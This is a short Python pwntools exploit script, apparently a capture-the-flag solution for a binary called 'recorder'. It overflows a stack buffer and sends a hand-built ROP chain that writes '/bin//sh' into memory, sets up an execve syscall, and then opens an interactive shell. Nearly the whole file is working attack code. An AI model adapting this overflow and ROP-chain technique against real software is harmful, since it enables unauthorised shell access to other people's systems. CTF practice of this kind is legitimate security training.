from pwn import *

p = process('./recorder')
#r = remote('ctf.adl.tw', 11004) 
#context.arch = 'amd64'
raw_input()
p.recv()
p.recvline()
p.recvuntil()


#shellcode = shellcraft.linux.sh()

#asm = asm('sub rsp, 32')
#jump rsp

payload = 'a' * 0x18
payload += p64(0x0000000000410183) # pop rsi ; ret
payload += p64(0x00000000006b90e0) # @ .data
payload += p64(0x000000000044955c) # pop rax ; ret
payload += p64(0x68732f2f6e69622f) # '/bin//sh'
payload += p64(0x000000000047f311) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000410183) # pop rsi ; ret
payload += p64(0x00000000006b90e8) # @ .data + 8
payload += p64(0x00000000004448f0) # xor rax, rax ; ret
payload += p64(0x000000000047f311) # mov qword ptr [rsi], rax ; ret
payload += p64(0x0000000000400686) # pop rdi ; ret
payload += p64(0x00000000006b90e0) # @ .data
payload += p64(0x0000000000410183) # pop rsi ; ret
payload += p64(0x00000000006b90e8) # @ .data + 8
payload += p64(0x00000000004495b5) # pop rdx ; ret
payload += p64(0x00000000006b90e8) # @ .data + 8
payload += p64(0x00000000004448f0) # xor rax, rax ; ret
payload += p64(0x000000000041d623) # pop rcx ; ret
payload += p64(0x000000000000003b) # 0x3b
payload += p64(0x000000000047e65b) # mov rax, rcx ; ret
payload += 'a' * 0x29
payload += p64(0x000000000044bb37) # syscall ; ret

#0F05C3   



p.send(payload)

#"\x48\x83\xEC\x20"
							
#p.sendline()
#p.sendafter()

p.interactive()
